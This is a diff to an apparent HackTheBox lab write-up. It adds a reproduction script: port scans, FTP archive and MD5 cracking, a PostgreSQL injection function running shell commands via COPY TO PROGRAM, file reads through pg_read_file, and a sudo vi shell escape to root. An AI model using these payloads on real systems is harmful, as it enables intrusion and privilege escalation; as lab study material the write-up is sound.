@@ -71,8 +71,15 @@ if($_POST['username'] === 'admin' &&
    md5($_POST['password']) === "<hardcoded md5>") {
 ```
 
-A hardcoded hash is a password with extra steps. Cracking the MD5 gave the admin
-password, and posting it to `/` returned a `302` to `dashboard.php`.
+A hardcoded hash is a password with extra steps. `john` cracks it the same way:
+
+```
+grep -oE '[a-f0-9]{32}' index.php > md5.hash
+john --format=raw-md5 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt md5.hash
+```
+
+That gave the admin password, and posting it to `/` returned a `302` to
+`dashboard.php`.
 
 ### The injection
 
@@ -175,6 +182,67 @@ argument.
 - `sudo vi <config>` shows up in auditd as `vi` starting a child shell. Command
   logging on the sudo rule, or `log_input`/`log_output`, would capture the
   `:!` line that makes it a privilege escalation.
+
+## Reproducing it
+
+Box IPs rotate, so `10.129.x.x` below stands for whatever the platform hands
+you. Wordlists used: `common.txt` for the archive, `rockyou.txt` for the MD5.
+Everything runs from the attacking host over the HTB VPN.
+
+```bash
+T=10.129.x.x
+
+# services
+nmap -p- --min-rate 3000 -T4 -oN allports.txt $T
+nmap -sCV -p21,22,80 $T
+
+# archive
+curl -O --user anonymous:anonymous ftp://$T/backup.zip
+zip2john backup.zip > zip.hash
+john --wordlist=~/wordlists/common.txt zip.hash
+
+unzip -P "$(john --format=PKZIP --show zip.hash | head -1 | cut -d: -f2)" backup.zip
+grep -oE '[a-f0-9]{32}' index.php > md5.hash
+john --format=raw-md5 \
+  --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt md5.hash
+
+# login
+curl -c cookies.txt -o /dev/null -w '%{http_code} %{redirect_url}\n' \
+  -d "username=admin&password=$(john --format=raw-md5 --show md5.hash | head -1 | cut -d: -f2)" http://$T/
+```
+
+The injection channel, as a shell function so quoting stops being a problem:
+
+```bash
+inj() {                      # run a command on the box
+  b64=$(printf '%s' "$1" | base64 -w0)
+  printf "%s" "'; COPY (SELECT 1) TO PROGRAM 'sh -c \"echo $b64 | base64 -d | sh\"';--" > /tmp/p
+  curl -sS -b cookies.txt -G --data-urlencode "search@/tmp/p" "http://$T/dashboard.php"
+}
+rd() {                       # read a file back
+  printf "%s" "' AND 1=2 UNION SELECT null,pg_read_file('$1'),null,null,null--" > /tmp/r
+  curl -sS -b cookies.txt -G --data-urlencode "search@/tmp/r" "http://$T/dashboard.php" \
+    | sed -n '/<tbody/,/<\/tbody>/p' | sed 's/<[^>]*>//g' | sed '/^[[:space:]]*$/d'
+}
+```
+
+```bash
+inj 'id -un > /tmp/who.txt'; rd /tmp/who.txt     # postgres
+rd /var/www/html/dashboard.php                   # DB password
+inj "echo '<db-password>' | sudo -S -l > /tmp/sudol.txt 2>&1"; rd /tmp/sudol.txt
+```
+
+The `vi` step needs a terminal, and the sudo rule pins its argument, so it has
+to be that exact command line with keystrokes fed in order. Delays matter; the
+first attempt without them raced the password prompt:
+
+```bash
+inj "(printf '<db-password>\n'; sleep 3; \
+      printf ':!id -un > /tmp/root.txt; chmod 644 /tmp/root.txt\n'; sleep 3; \
+      printf ':q!\n') | TERM=xterm script -qc \
+      'sudo -S /bin/vi /etc/postgresql/11/main/pg_hba.conf' /dev/null"
+rd /tmp/root.txt
+```
 
 ---
 
